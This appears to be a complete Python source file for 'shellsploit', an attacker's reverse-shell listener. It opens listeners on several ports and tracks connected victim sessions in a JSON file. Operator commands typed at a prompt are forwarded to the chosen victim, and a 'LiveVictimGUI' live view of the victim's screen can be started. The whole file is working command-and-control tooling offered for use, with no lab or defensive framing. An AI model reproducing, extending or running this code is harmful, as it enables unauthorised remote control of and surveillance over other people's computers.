import threading
import os
import json
import socket
from LiveGUI import LiveVictimGUI
import time
import sys
def reverse_shell():
    HOST = '0.0.0.0'
    SESSION_FILE = "sessions.json"
    sessions = {}     
    listeners = {}   
    active_port = None
    lock = threading.Lock()
    def load_sessions():
        if os.path.exists(SESSION_FILE):
            try:
                with open(SESSION_FILE, "r") as f:
                    return json.load(f)
            except:
                pass
        return {"listeners": [], "active_sessions": []}
    def save_sessions():
        try:
            data = {
                "listeners": [],
                "active_sessions": []
            }
            for p in listeners:
                if p not in sessions:
                    data["listeners"].append(p)
            for p in sessions:
                data["active_sessions"].append(p)
            with open(SESSION_FILE, "w") as f:
                json.dump(data, f, indent=2)
        except:
            pass
    def handle_client(client, addr, port):
        nonlocal sessions, active_port
        print(f"\n[+] Connected {addr[0]}:{addr[1]} on port {port}")
        with lock:
            if port in sessions:
                try:
                    sessions[port].close()
                except:
                    pass
            sessions[port] = client
            save_sessions()
        client.settimeout(1.0)
        while True:
            try:
                data = client.recv(4096)
                if not data:
                    break
                if b"LIVE_START" in data and active_port == port:
                    pass
                else:
                    msg = data.decode(errors="ignore").rstrip()
                    if active_port == port and not msg.startswith("LIVE_START"):
                        print(msg)
            except socket.timeout:
                continue
            except:
                break
        print(f"\n[-] Disconnected from port {port}")
        with lock:
            if port in sessions:
                del sessions[port]
            save_sessions()
    def start_listener(port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((HOST, port))
        server.listen(5)
        with lock:
            listeners[port] = True
            save_sessions()
        print(f"[+] Listening on {port}")
        while True:
            try:
                client, addr = server.accept()
                threading.Thread(
                    target=handle_client,
                    args=(client, addr, port),
                    daemon=True
                ).start()
            except:
                break
    def start_live_view(client):
        def run_gui():
            try:
                LiveVictimGUI(client)
            except Exception as e:
                print(f"[ERROR] GUI failed: {e}")
            finally:
                print("\n[!] Live view stopped")
        live_thread = threading.Thread(target=run_gui, daemon=True)
        live_thread.start()
        return live_thread
    def input_handler():
        nonlocal active_port
        while True:
            try:
                cmd = input("shellsploit > ").strip()
            except:
                break
            if cmd.startswith("use"):
                try:
                    p = int(cmd.split()[1])
                    if p in sessions:
                        active_port = p
                        print(f"[+] Using session on port {p}")
                    else:
                        print(f"[-] No active session on port {p}")
                except:
                    print("Usage: use <port>")
            elif cmd.lower() == "gui":
                if active_port and active_port in sessions:
                    try:
                        sessions[active_port].send(b"gui\n")
                        time.sleep(0.5)  
                        start_live_view(sessions[active_port])
                    except Exception as e:
                        print(f"[ERROR] Failed to start GUI: {e}")
                else:
                    print("[-] No active session selected (use 'use <port>' first)")
            elif cmd == "clear" or cmd == "cls":
                os.system('cls' if os.name == 'nt' else 'clear')
            elif cmd == "sessions":
                print("\n--- ACTIVE SESSIONS ---")
                for p in sorted(sessions.keys()):
                    print(f"Port {p} -> CONNECTED")
                print("\n--- LISTENING PORTS ---")
                for p in sorted(listeners.keys()):
                    if p not in sessions:
                        print(f"Port {p} -> LISTENING")
                print()
            elif cmd == "background":
                active_port = None
                print("[+] Backgrounded current session")
            elif cmd == "exit":
                break
            else:
                if active_port in sessions:
                    try:
                        sessions[active_port].send((cmd + "\n").encode())
                    except:
                        print("[-] Failed to send command")
                else:
                    print("[-] No active session selected")
    data = load_sessions()
    ports = data.get("listeners", []) + data.get("active_sessions", [])
    ports = list(set(ports))
    if len(sys.argv) > 1:
        ports += [int(p) for p in sys.argv[1:]]
    ports = list(set(ports))
    for p in ports:
        listeners[p] = True
    save_sessions()
    for port in ports:
        threading.Thread(target=start_listener, args=(port,), daemon=True).start()
    input_handler()
    print("\n[!] Shutting down...")
    with lock:
        sessions.clear()
        save_sessions()
if __name__ == "__main__":
    reverse_shell()